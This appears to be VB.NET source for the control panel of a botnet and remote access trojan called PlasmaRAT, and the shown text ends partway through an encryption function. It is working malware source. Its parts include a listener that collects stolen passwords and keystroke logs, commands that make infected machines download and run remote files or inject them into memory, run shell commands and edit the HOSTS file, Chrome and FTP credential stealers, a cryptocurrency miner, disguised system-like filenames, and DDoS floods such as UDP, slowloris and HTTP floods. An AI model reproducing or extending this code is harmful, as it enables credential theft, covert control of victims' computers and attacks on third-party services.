Imports System.Net.Sockets, System.Net, System.IO
Imports System.Threading
Imports System.Windows.Forms
Imports System
Imports System.Drawing

Public Class Main
    Dim listener As TcpListener
    Dim listenerThread As Thread
    Public Shared EncryptionKey As String = "TestUser"
    Dim PasswordLogs As String = "Plasma Password Logs" & vbNewLine & vbNewLine
    Dim BotLogs As String = "Plasma Bot Logs" & vbNewLine & vbNewLine
    Dim CommandsLogs As String = "Plasma Command Logs" & vbNewLine & vbNewLine
    Public Shared OnConnectCommand = String.Empty
    Public Shared OnConnectMiner = String.Empty
    Public PeakBots As Integer = 0
    Public PortToListenTo As Integer = 1337
    Public Shared OnJoinTopLel = "JOIN"
    Public MinerFileURL As String
    Private BotViewSort As ColumnHeader '- BotListView
    Private LogViewerSort As ColumnHeader '- LogView
    Private PasswordViewSort As ColumnHeader '- Password ListView

    Private Sub Label3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub


    Sub Listen()
        Try
            listener = New TcpListener(IPAddress.Any, PortToListenTo)
            listener.Start()
            While (True)
                Dim c As New Connection(listener.AcceptTcpClient())
                AddHandler c.GotInfo, AddressOf GotInfo
                AddHandler c.Disconnected, AddressOf Disconnected
            End While

        Catch
        End Try

    End Sub
    Sub AddClient(ByVal client As Connection, ByVal strings() As String)
        Try
            Dim l As New ListViewItem(strings)
            l.Tag = client

            '     If Not BotListView.Items.Contains(l) Then

            If SingleConnection.Checked = True Then
                For Each item As ListViewItem In BotListView.Items
                    If item.Text = client.IPAddress Then
                        item.Remove()
                        Exit For
                    End If
                Next
            End If
            BotListView.Items.Add(l)
            If Not OnConnectCommand = String.Empty Then
                Threading.Thread.Sleep(100)
                Dim c As Connection = DirectCast(client, Connection)
                c.Send(OnConnectCommand)
            End If

            If Not OnConnectMiner = String.Empty Then
                Threading.Thread.Sleep(100)
                Dim c As Connection = DirectCast(client, Connection)
                c.Send(OnConnectMiner)
            End If
            If LowBandwidth.Checked = True Then
                Threading.Thread.Sleep(100)
                Dim c As Connection = DirectCast(client, Connection)
                c.Send("mute on")
            End If



        Catch : End Try
        '   End If
    End Sub
    Public Sub AddLoggs(ByVal input As Object)
        Try
            LogView.Items.Add(input)
        Catch ex As Exception
        End Try
    End Sub
    Public Sub AddPassword(ByVal input As Object)
        Try
            PasswordListView.Items.Add(input)

        Catch ex As Exception
        End Try
    End Sub
    Delegate Sub AddDelegate(ByVal client As Connection, ByVal strings() As String)
    Delegate Sub AddLogs(ByVal input As Object)
    Delegate Sub AddChrome(ByVal input As Object)
    Sub GotInfo(ByVal client As Connection, ByVal Msg As String)

        Try

            '  MessageBox.Show(Msg.ToString)
            Dim cut() As String = Msg.Split("*")
            '   MessageBox.Show(cut(0))
            Select Case cut(0)
                Case OnJoinTopLel
                    Try
                        Invoke(New AddDelegate(AddressOf AddClient), client, New String() {client.IPAddress, cut(2), cut(3), cut(4), cut(5), cut(6), cut(1)})
                        '  country = cut(1)
                    Catch : End Try
                Case "LOGS"
                    Try
                        Dim x() = Split(Msg, "*")
                        Dim lmao = x(1) & ": " & x(2)
                        BotLogs = BotLogs & lmao & vbNewLine
                        Dim l3 As New ListViewItem({x(1), x(2)})
                        Invoke(New AddLogs(AddressOf AddLoggs), l3)
                    Catch ex As Exception
                        MessageBox.Show(ex.ToString)
                    End Try
                Case "KEYLOGS"
                    Try
                        Dim directory As String = My.Application.Info.DirectoryPath & "\Keylogs\"
                        Dim dir As New IO.DirectoryInfo(directory)
                        If Not dir.Exists Then dir.Create()
                        Dim lels = Msg
                        lels = lels.Replace("KEYLOGS*", String.Empty)
                        lels = lels.Replace(cut(1) & "*", String.Empty)
                        lels = lels.Replace("Oem7", """")
                        IO.File.WriteAllText(directory & cut(1) & ".txt", vbNewLine & lels)
                    Catch : End Try
                Case "PASS"
                    Try
                        Dim x() = Split(Msg, "*")



                        Dim CurClient As New ListViewItem(x(1)) ' Site
                        CurClient.SubItems.Add(x(2)) ' User
                        CurClient.SubItems.Add(x(3)) ' Pass

                        Dim lmao As String = "Website: " & x(1) & vbNewLine & "Username: " & x(2) & vbNewLine & "Password: " & x(3) & vbNewLine & vbNewLine


                        If PasswordLogs.Contains(lmao) Then
                        Else
                            PasswordLogs = PasswordLogs & lmao
                            Invoke(New AddChrome(AddressOf AddPassword), CurClient)
                            'PasswordListView.Items.Add(CurClient)
                        End If
                    Catch ex As Exception
                        MessageBox.Show(ex.ToString)
                    End Try
                Case "Disconnect"

                    listener.EndAcceptSocket(client)
                    '      Dim client1 = listener.EndAcceptTcpClient(client)
            End Select
        Catch ex As Exception
            If ClientOnError.Checked = True Then
                Disconnected(client)
                client.Send("RECONNECT")
                listener.EndAcceptTcpClient(client)
            End If
        End Try
    End Sub
    Delegate Sub DisconnectedDelegate(ByVal client As Connection)
    Sub Disconnected(ByVal client As Connection)
        Invoke(New DisconnectedDelegate(AddressOf Remove), client)
    End Sub
    Sub Remove(ByVal client As Connection)
        Try
            For Each item As ListViewItem In BotListView.Items
                If item.Text = client.IPAddress Then

                    item.Remove()

                    Exit For
                End If
            Next
        Catch : End Try
    End Sub
    Sub RemoveSelected()
        Try
            For Each item As ListViewItem In BotListView.SelectedItems
                Try
                    Dim c As Connection = DirectCast(item.Tag, Connection)
                    BotListView.Items.Remove(item.Tag)
                Catch ex As Exception

                End Try
            Next
        Catch : End Try
    End Sub
    Delegate Sub UpdateStatusDelegate(ByVal client As Connection, ByVal Message As String)
    Sub UpdateStatus(ByVal client As Connection, ByVal Message As String)
        For Each item As ListViewItem In BotListView.Items
            If item.Text = client.IPAddress Then
                item.SubItems(3).Text = Message
            End If
        Next
    End Sub
    Delegate Sub UpdateLogDelegate(ByVal client As Connection, ByVal Message As String)

    Sub SendToAll(ByVal Message As String)
        AddCommandListView(Message)
        For Each item As ListViewItem In BotListView.Items
            Try



                Dim c As Connection = DirectCast(item.Tag, Connection)
                c.Send(Message)
            Catch ex As Exception

                '        BotListView.Items.Remove(item.Tag)


            End Try
        Next
    End Sub
    Sub SendToSelected(ByVal Message As String)
        AddCommandListView(Message)
        For Each item As ListViewItem In BotListView.SelectedItems
            Try



                Dim c As Connection = DirectCast(item.Tag, Connection)
                c.Send(Message)
            Catch ex As Exception

            End Try
        Next
    End Sub





    Private Sub TreeView2_AfterSelect(ByVal sender As System.Object, ByVal e As System.Windows.Forms.TreeViewEventArgs) Handles TreeView2.AfterSelect
        Try
            If TreeView2.SelectedNode.ToString.Contains("Execute File") Then
                Dim S As String = InputBox("File to Download and Execute (Direct Download Link):", "")
                If Not S = String.Empty Then

                    Dim D As String = InputBox("Run File As (Example: svchost.exe, msconfig.exe, file.jar, system.vbs):", "")
                    If Not D = String.Empty Then


                        SendToAll("download " & S & " " & D)
                    End If
                End If
            End If
            If TreeView2.SelectedNode.ToString.Contains("Update File") Then
                If MsgBox("Are you sure you want to start the update process? This will remove the bot after running the new one.", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
                    Dim S As String = InputBox("File to Update to (Direct Download Link):", "")
                    If Not S = String.Empty Then

                        Dim D As String = InputBox("Run File As (Example: svchost.exe, msconfig.exe, file.jar, system.vbs):", "")
                        If Not D = String.Empty Then


                            SendToAll("update.bot " & S & " " & D)
                        End If
                    End If
                End If
            End If
            If TreeView2.SelectedNode.ToString.Contains("Seed Torrent") Then
                Dim S As String = InputBox("Torrent File to Seed (Direct Download Link .torrent):", "")
                If Not S = String.Empty Then
                    SendToAll("seed " & S)
                End If
            End If


            If TreeView2.SelectedNode.ToString.Contains("Run Bot Killer") Then
                If MsgBox("Are you sure you want to run the Bot Killer Command? This will remove any existing malware on the system.", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                    SendToAll("botkiller.run")
                End If

            End If
            If TreeView2.SelectedNode.ToString.Contains("Download Logs") Then
                If MsgBox("Are you sure you want to download Keylogs for all users?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
                    SendToAll("keylogger.send")
                End If
            End If
            If TreeView2.SelectedNode.ToString.Contains("Delete Logs") Then
                If MsgBox("Are you sure you want to DELETE Keylogs for all users?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
                    SendToAll("keylogger.delete")
                End If
            End If
            If TreeView2.SelectedNode.ToString.Contains("Search Logs") Then

                Dim S As String = InputBox("Search Logs for Term (Case Sensitive):", "")
                If Not S = String.Empty Then
                    SendToAll("keylogger.search " & """" & S & """")
                End If
            End If
            If TreeView2.SelectedNode.ToString.Contains("Run Hard BK") Then
                If MsgBox("Are you sure you want to run the Hard Bot Killer? This will hinder the installation of new files on the system. Please only use this on highly infected computers.", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                    SendToAll("botkiller.hardbk")
                End If

            End If
            If TreeView2.SelectedNode.ToString.Contains("Uninstall") Then
                If MsgBox("Are you sure you want to run the uninstall command? This will remove the bot from this system.", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then


                    SendToAll("remove.bot")

                End If

            End If

            If TreeView2.SelectedNode.ToString.Contains("Enable BK") Then
                If MsgBox("Are you sure you want to enable the Proactive Bot Killer?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                    SendToAll("botkiller.enable")
                End If

            End If

            If TreeView2.SelectedNode.ToString.Contains("Disable BK") Then
                If MsgBox("Are you sure you want to disable the Proactive Bot Killer?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                    SendToAll("botkiller.disable")
                End If

            End If
            If TreeView2.SelectedNode.ToString.Contains("Chrome Stealer") Then
                If MsgBox("Recover Saved Chrome Passwords?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                    SendToAll("chrome")
                End If

            End If
            If TreeView2.SelectedNode.ToString.Contains("FTP Stealer") Then
                If MsgBox("Recover FTP Accounts?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                    SendToAll("ftp")
                End If

            End If
            If TreeView2.SelectedNode.ToString.Contains("General Info") Then
                If MsgBox("Retrieve General PC Info?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                    SendToAll("info")
                End If

            End If
            If TreeView2.SelectedNode.ToString.Contains("PC Specifications") Then
                If MsgBox("Retrieve PC Specifications?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                    SendToAll("pcspecs")
                End If

            End If
            If TreeView2.SelectedNode.ToString.Contains("AV Info") Then
                If MsgBox("Retrieve AV Info?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                    SendToAll(".avdetails")
                End If

            End If
            If TreeView2.SelectedNode.ToString.Contains("Enable Mute") Then
                If MsgBox("Enable Mute?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                    SendToAll("mute on")
                End If

            End If
            If TreeView2.SelectedNode.ToString.Contains("Disable Mute") Then
                If MsgBox("Disable Mute?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                    SendToAll("mute off")
                End If

            End If
            If TreeView2.SelectedNode.ToString.Contains("Uninstall") Then
                If MsgBox("Are you sure you want to remove all bots? This action cannot be undone.", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                    SendToAll("remove.bot")
                End If
            End If

            If TreeView2.SelectedNode.ToString.Contains("Open Visible") Then

                Dim S As String = InputBox("URL To Open (Default Browser):", "")
                If Not S = String.Empty Then
                    Dim URL As String
                    If Not S.Contains("http://") Then
                        URL = S
                        S = "http://" & URL
                    End If

                    SendToAll("visit " & S)
                End If
            End If


            If TreeView2.SelectedNode.ToString.Contains("Open Hidden") Then

                Dim S As String = InputBox("URL To Open (Hidden Internet Explorer):", "")
                If Not S = String.Empty Then
                    Dim URL As String
                    If Not S.Contains("http://") Then
                        URL = S
                        S = "http://" & URL
                    End If

                    SendToAll("visit -h " & S)
                End If
            End If
            If TreeView2.SelectedNode.ToString.Contains("Inject via RunPE") Then

                Dim S As String = InputBox("File to Inject into Memory via RunPE (Direct Download Link):", "")
                If Not S = String.Empty Then
                    SendToAll("inject.runpe " & S)
                End If
            End If
            If TreeView2.SelectedNode.ToString.Contains("Inject via Reflection") Then

                Dim S As String = InputBox("File to Inject into Memory via Reflection (Direct Download Link):", "")
                If Not S = String.Empty Then
                    SendToAll("inject.reflect " & S)
                End If
            End If


            If TreeView2.SelectedNode.ToString.Contains("Shell Command") Then

                Dim S As String = InputBox("Command to Execute:", "")
                If Not S = String.Empty Then


                    SendToAll("shell " & """" & S & """")
                End If
            End If
            If TreeView2.SelectedNode.ToString.Contains("Edit HOSTS File") Then

                Dim S As String = InputBox("Line to add to HOSTS:", "")
                If Not S = String.Empty Then

                    SendToAll("hosts " & """" & S & """")
                End If
            End If
        Catch ex As Exception
            MessageBox.Show("A strange error has occured. Report this to KFC Watermelon: " & vbNewLine & ex.ToString, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub
    Public Sub SendCommand(ByVal what As String)
        If SelectedOnly.Checked = True Then

            SendToSelected(what)

        Else
            Try
                SendToAll(what)
            Catch ex As Exception
                '  MsgBox("Error Sending Command")
            End Try


        End If


    End Sub
    Public Sub AddCommandListView(ByVal command As String)

        If Not command = "ping" Then
            Try
                Dim lmao = command


                If Not CommandsLogs.Contains(lmao) Then
                    CommandsLogs = CommandsLogs & lmao & vbNewLine


                    Dim CurClient As New ListViewItem(command)

                    CommandsListView.Items.Add(CurClient)
                End If




            Catch : End Try
        End If
    End Sub
    Private Sub Form1_Load_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        Try
            TabControl1.Dock = DockStyle.Fill

            Dim r As New Random
            Dim Counter As Integer = r.Next(1, 5)
            If Counter = 1 Then
                FileName.Text = "appsvc.exe"
                Folder.Text = "Application Services"
            End If
            If Counter = 2 Then
                FileName.Text = "wserver.exe"
                Folder.Text = "Windows Server"
            End If
            If Counter = 3 Then
                FileName.Text = "win32.exe"
                Folder.Text = "Windows Services"
            End If
            If Counter = 4 Then
                FileName.Text = "NTKernel.exe"
                Folder.Text = "NT Kernel"
            End If
            If Counter = 5 Then
                FileName.Text = "nacl32.exe"
                Folder.Text = "System Configuration"
            End If


            If Not GetSetting("PlasmaRAT", "Config", "Port") = String.Empty Then
                PortToListenTo = Convert.ToInt32(GetSetting("PlasmaRAT", "Config", "Port"))
                PORTBuild.Text = GetSetting("PlasmaRAT", "Config", "Port")
            Else
                Dim x = r.Next(1000, 8000)
                PortToListenTo = x
                PORTBuild.Text = x.ToString
            End If
            If Not GetSetting("PlasmaRAT", "Config", "SingleConnection") = String.Empty Then SingleConnection.Checked = False
            If Not GetSetting("PlasmaRAT", "Config", "PingPong") = String.Empty Then PingPong.Checked = False
            If Not GetSetting("PlasmaRAT", "Config", "DisconnectonError") = String.Empty Then ClientOnError.Checked = False
            If Not GetSetting("PlasmaRAT", "Config", "LowBandwidth") = String.Empty Then LowBandwidth.Checked = True


            If Not GetSetting("PlasmaRAT", "Config", "DNS") = String.Empty Then
                DNSBuild.Text = GetSetting("PlasmaRAT", "Config", "DNS")
            End If
            If Not GetSetting("PlasmaRAT", "Config", "MinerSettings") = String.Empty Then
                Dim lels() = Split(GetSetting("PlasmaRAT", "Config", "MinerSettings"), " ")
                MinerFiles.Text = lels(0)
                MinerPool.Text = lels(1)
                MinerUser.Text = lels(2)
                MinerPass.Text = lels(3)
            End If
        Catch ex As Exception
            MessageBox.Show("A really strange error has occured. You should report this to KFC Watermelon: " & vbNewLine & ex.ToString, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try

        Try
            EncryptionKey = Seal.Username
            OnJoinTopLel = Seal.GetVariable("AUTHKEY")
            MinerFileURL = Seal.GetVariable("Files") '"http://files.plasmarat.pw/CPUMiner.files|http://files.plasmarat.pw/GPUMiner.files|" ''Seal.GetVariable("MinerFile")
            Dim lel() = Split(MinerFileURL, "|")
            MinerFiles.Text = lel(0)
            If MinerFiles.Text = "http://google.com/file.exe" Then End
            If GlobalMessage.Text = "InvalidSystemInfo" Then End
            Timer1.Start()
            Ping.Start()
        Catch
            MessageBox.Show("An error occured. Error 0x0159")
            Environment.Exit(0)
            End
        End Try

    End Sub
    Private Sub Form1CLose(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.FormClosing

        End


    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim bots As Integer = BotListView.Items.Count
        BotsOnline.Text = "Bots Online: " & bots.ToString

        If bots > PeakBots Then
            PeakBots = bots
            BotPeak.Text = "Peak: " & PeakBots.ToString
        End If

        If BotListView.SelectedItems.Count > 0 Then
            SelectedBots.Text = "Selected Bots: " & BotListView.SelectedItems.Count.ToString
        Else
            SelectedBots.Text = "Selected Bots: 0"
        End If
    End Sub

    Private Sub Button9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If UDP.Checked Then

            SendCommand("ddos.stop.udp")
        End If
        If condis.Checked Then

            SendCommand("ddos.stop.condis")
        End If
        If httpget.Checked Then

            SendCommand("ddos.stop.httpget")
        End If
        If httppost.Checked Then

            SendCommand("ddos.stop.posthttp")
        End If
        If slowloris.Checked Then

            SendCommand("ddos.stop.slowloris")
        End If
        If arme.Checked Then

            SendCommand("ddos.stop.arme")
        End If
        If bwflood.Checked Then

            SendCommand("ddos.stop.bwflood")
        End If

    End Sub
    Sub ChangedDDoS()
        Dim x = " "
        If UDP.Checked Then
            threads.Text = "2"
            Description.Text = "Description: Standard UDP Flood"
            use.Text = "Use: Home Connections, any typical Server/IP"
            info.Text = "Info: Only put in IP in target."
        End If
        If condis.Checked Then
            threads.Text = "10"
            Description.Text = "Description: Rapid Connect/Disconnect. Sends small TCP Packets."
            use.Text = "Use: Game Servers, TeamSpeak, web servers, etc"
            info.Text = "Info: Only put in IP in target."
        End If
        If httpget.Checked Then
            threads.Text = "20"
            Description.Text = "Description: Standard HTTP GET Flood"
            use.Text = "Use: Websites"
            info.Text = "Info: Put URL to Attack in Target. Add http://"
        End If
        If httppost.Checked Then
            threads.Text = "20"
            Description.Text = "Description: Standard HTTP POST Flood"
            use.Text = "Use: Websites. Put in Data to POST."
            info.Text = "Info: Put URL to Attack in Target. Add http://"
        End If
        If slowloris.Checked Then
            threads.Text = "10"
            Description.Text = "Description: Slowloris Attack"
            use.Text = "Use: Websites."
            info.Text = "Info: Put host in target. Ex: google.com "
        End If
        If arme.Checked Then
            threads.Text = "10"
            Description.Text = "Description: Powerful against websites using Apache Web Server"
            use.Text = "Use: Websites running Apache Web Server"
            info.Text = "Info: Put host in target. Ex: google.com "
        End If
        If bwflood.Checked Then
            threads.Text = "5"
            Description.Text = "Description: Floods Bandwidth Usage"
            use.Text = "Use: Files on websites"
            info.Text = "Info: Put File URL to Attack in Target. Ex: http://google.com/logo.png"
        End If
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim x = " "
        If UDP.Checked Then
            SendCommand("ddos.udp.start " & target.Text & x & port.Text & x & time.Text & x & threads.Text)

        End If
        If condis.Checked Then

            SendCommand("ddos.condis.start " & target.Text & x & port.Text & x & time.Text & x & threads.Text)
        End If
        If httpget.Checked Then

            SendCommand("ddos.httpget.start " & target.Text & x & time.Text & x & threads.Text)
        End If
        If httppost.Checked Then

            SendCommand("ddos.posthttp.start " & target.Text & x & time.Text & x & threads.Text & x & """" & data.Text & """")
        End If
        If slowloris.Checked Then

            SendCommand("ddos.slowloris.start " & target.Text & x & time.Text & x & threads.Text)
        End If
        If arme.Checked Then

            SendCommand("ddos.arme.start " & target.Text & x & time.Text & x & threads.Text)
        End If
        If bwflood.Checked Then

            SendCommand("ddos.bwflood.start " & target.Text & x & time.Text & x & threads.Text)
        End If
    End Sub

    Private Sub UDP_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UDP.CheckedChanged
        ChangedDDoS()
    End Sub

    Private Sub condis_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles condis.CheckedChanged
        ChangedDDoS()
    End Sub

    Private Sub httpget_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles httpget.CheckedChanged
        ChangedDDoS()
    End Sub

    Private Sub httppost_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles httppost.CheckedChanged
        ChangedDDoS()
    End Sub

    Private Sub slowloris_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles slowloris.CheckedChanged
        ChangedDDoS()
    End Sub

    Private Sub arme_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles arme.CheckedChanged
        ChangedDDoS()
    End Sub

    Private Sub bwflood_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles bwflood.CheckedChanged
        ChangedDDoS()
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        If TextBox5.Text.Contains("http://") Then TextBox5.Text = TextBox5.Text.Replace("http://", String.Empty)

        Try
            target.Text = System.Net.Dns.GetHostByName(TextBox5.Text).AddressList(0).ToString()
        Catch
            MsgBox("Unable to resolve hostname")
        End Try

    End Sub

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub TextBox7_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub ToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem1.Click
        If MsgBox("Retrieve General PC Info?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            SendToSelected("info")
        End If
    End Sub


    Private Sub OpenVisibleToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenVisibleToolStripMenuItem.Click


        Dim S As String = InputBox("URL To Open (Default Browser):", "")
        If Not S = String.Empty Then
            Dim URL As String
            If Not S.Contains("http://") Then
                If Not S.Contains("https://") Then
                    URL = S
                    S = "http://" & URL
                End If
            End If

            SendToSelected("visit " & S)
        End If

    End Sub

    Private Sub OpenHiddenToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenHiddenToolStripMenuItem.Click
        Dim S As String = InputBox("URL To Open (Default Browser):", "")
        If Not S = String.Empty Then
            Dim URL As String
            If Not S.Contains("http://") Then
                If Not S.Contains("https://") Then
                    URL = S
                    S = "http://" & URL
                End If
            End If

            SendToSelected("visit -h " & S)
        End If
    End Sub

    Private Sub StartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartToolStripMenuItem1.Click

        Dim S As String = InputBox("Command to Execute:", "")
        If Not S = String.Empty Then


            SendToSelected("shell " & """" & S & """")
        End If
    End Sub

    Private Sub StopToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopToolStripMenuItem2.Click
        Dim S As String = InputBox("Line to add to HOSTS:", "")
        If Not S = String.Empty Then

            SendToSelected("hosts " & """" & S & """")
        End If
    End Sub

    Private Sub RunBotKillerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunBotKillerToolStripMenuItem.Click
        If MsgBox("Are you sure you want to run the Bot Killer Command? This will remove any existing malware on the system.", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            SendToSelected("botkiller.run")
        End If
    End Sub

    Private Sub EnableProactiveBotKillerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableProactiveBotKillerToolStripMenuItem.Click
        If MsgBox("Are you sure you want to enable the Proactive Bot Killer?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            SendToSelected("botkiller.enable")
        End If



    End Sub

    Private Sub DisableProactiveBotKillerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableProactiveBotKillerToolStripMenuItem.Click
        If MsgBox("Are you sure you want to disable the Proactive Bot Killer?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            SendToSelected("botkiller.disable")
        End If
    End Sub

    Private Sub ChromeStealerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ChromeStealerToolStripMenuItem.Click
        If MsgBox("Recover Saved Chrome Passwords?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            SendToSelected("chrome")
        End If
    End Sub

    Private Sub FTPStealerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FTPStealerToolStripMenuItem.Click
        If MsgBox("Recover FTP Accounts?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            SendToSelected("ftp")
        End If
    End Sub

    Private Sub StopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopToolStripMenuItem.Click
        If MsgBox("Retrieve PC Specifications?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            SendToSelected("pcspecs")
        End If
    End Sub

    Private Sub AVInfoToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AVInfoToolStripMenuItem.Click
        If MsgBox("Retrieve AV Info?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            SendToSelected(".avdetails")
        End If
    End Sub

    Private Sub EnableMuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableMuteToolStripMenuItem.Click
        If MsgBox("Enable Mute?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            SendToSelected("mute on")
        End If
    End Sub

    Private Sub DisableMuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableMuteToolStripMenuItem.Click
        If MsgBox("Disable Mute?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            SendToSelected("mute off")
        End If
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        If MsgBox("Are you sure you want to run the uninstall command? This will remove the bot from this system.", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            If MsgBox("Are you COMPLETELY sure you want to run the Uninstall command? You will lose your bots.", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then

                SendToSelected("remove.bot")
            End If
        End If
    End Sub

    Private Sub LogView_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogView.SelectedIndexChanged

    End Sub

    Private Sub ToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem2.Click
        BotListView.BeginUpdate()
        For Each i As ListViewItem In BotListView.Items
            i.Selected = True
        Next
        BotListView.EndUpdate()


    End Sub

    Private Sub ToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem3.Click
        Try
            Dim S As String = InputBox("Number of Bots to Select:", "")
            If Not S = String.Empty Then


                Dim x = Convert.ToInt32(S)

                If Not x > BotListView.Items.Count.ToString Then
                    Dim Selected = 0

                    BotListView.BeginUpdate()
                    For Each i As ListViewItem In BotListView.Items
                        If Not Selected = x Then
                            Selected = Selected + 1
                            i.Selected = True
                        End If


                    Next
                    BotListView.EndUpdate()

                Else
                    MsgBox("You do not have this many bots online")
                End If



            End If

        Catch
            MsgBox("An error occured.")
        End Try
    End Sub

    Private Sub Button11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub ExecuteFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExecuteFileToolStripMenuItem.Click
        Dim S As String = InputBox("File to Download and Execute (Direct Download Link):", "")
        If Not S = String.Empty Then

            Dim D As String = InputBox("Run File As (Example: svchost.exe, msconfig.exe, file.jar, system.vbs):", "")
            If Not D = String.Empty Then


                SendToSelected("download " & S & " " & D)
            End If
        End If
    End Sub

    Private Sub UpdateToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UpdateToolStripMenuItem.Click
        If MsgBox("Are you sure you want to start the update process? This will remove the bot after running the new one.", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            Dim S As String = InputBox("File to Update to (Direct Download Link):", "")
            If Not S = String.Empty Then

                Dim D As String = InputBox("Run File As (Example: svchost.exe, msconfig.exe, file.jar, system.vbs):", "")
                If Not D = String.Empty Then


                    SendToSelected("update.bot " & S & " " & D)
                End If
            End If
        End If
    End Sub
    Public Function AES_Encrypt(ByVal input As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(EncryptionKey))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = System.Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
        End Try
    End Function
    Public Function AES_Decrypt(ByVal input As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
